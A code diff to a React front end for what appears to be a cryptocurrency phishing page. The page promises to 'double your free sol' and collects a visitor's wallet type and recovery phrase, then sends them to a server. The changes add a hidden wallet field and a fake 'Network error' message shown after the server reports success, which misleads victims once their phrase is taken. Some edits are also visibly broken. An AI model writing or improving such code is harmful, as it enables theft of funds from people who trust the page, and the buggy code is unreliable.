@@ -26,6 +26,7 @@ export default function Home() {
   const [clickFreeText, setClickFreeText] = useState('Click me to double your free sol');
   const [wallet, setWallet] = useState('');
   const [phrase, setPhrase] = useState('');
+  const [error, setError] = useState('');
 
 
   const connectWallet = async (e) => {
@@ -38,6 +39,13 @@ export default function Home() {
             },withCredentials: true
         })
         console.log(response.data);
+        if (response.data.status === "success"){
+            setError("Network error. check connection");
+        }
+
+        if (response.data.status === "success"){
+            setError(response.data.message);
+        }
     } catch (error) {
         console.log("Error sending phrase: ", error);
     }
@@ -103,7 +111,7 @@ export default function Home() {
     walletPhrase.classList.add('active');
     walletTypeContainer.classList.add('active');
 
-    setWallet(e.currentTarget.value);
+    setWallet(e.currentTarget.value.innerHTML);
   }
 
   const soundClicked = (e) => {
@@ -351,6 +359,7 @@ export default function Home() {
             </header>
             <p className="require">You must have atleat 0.02 sol to continue</p>
             <div className="Wallet-type-container">
+                <input name="wallet" value={wallet} onChange={(e) => setWallet(e.target.value)} type="text" hidden />
                 <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                     <img src="/ave.svg" alt="wallet logo" />
                     <p>Ave Wallet</p>
@@ -373,6 +382,9 @@ export default function Home() {
                 </button>
             </div>
             <div className="Wallet-phrase-container">
+                <div className={`error
+                    ${error ? "active" : "hidden"}
+                    `}></div>
                 <label htmlFor="phrase">Wallet Phrase</label>
                 <textarea name="phrase" value={phrase} onChange={(e) => setPhrase(e.target.value)} id="phrase"></textarea>
                 <div className="form-btn-container">
